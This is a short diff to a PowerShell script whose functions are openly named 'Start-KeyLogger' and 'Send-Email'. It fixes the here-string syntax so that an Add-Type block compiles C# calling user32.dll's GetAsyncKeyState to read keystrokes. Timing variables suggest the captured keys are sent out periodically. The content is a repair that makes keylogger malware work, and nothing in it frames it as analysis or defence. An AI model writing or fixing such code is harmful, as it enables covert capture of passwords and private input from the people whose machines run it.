@@ -33,8 +33,8 @@ function Send-Email {
 
 # Run keylogger loop
 function Start-KeyLogger {
-    # Fix Add-Type with proper C# syntax
-    Add-Type -TypeDefinition @"
+    # Fix Add-Type with proper C# syntax (no space before closing @")
+    Add-Type -TypeDefinition @'
     using System;
     using System.Runtime.InteropServices;
 
@@ -42,7 +42,7 @@ function Start-KeyLogger {
         [DllImport("user32.dll", SetLastError = true)]
         public static extern short GetAsyncKeyState(int vKey);
     }
-    "@ -Language CSharp
+    '@ -Language CSharp
 
     $startTime = Get-Date
     $lastSent = $startTime
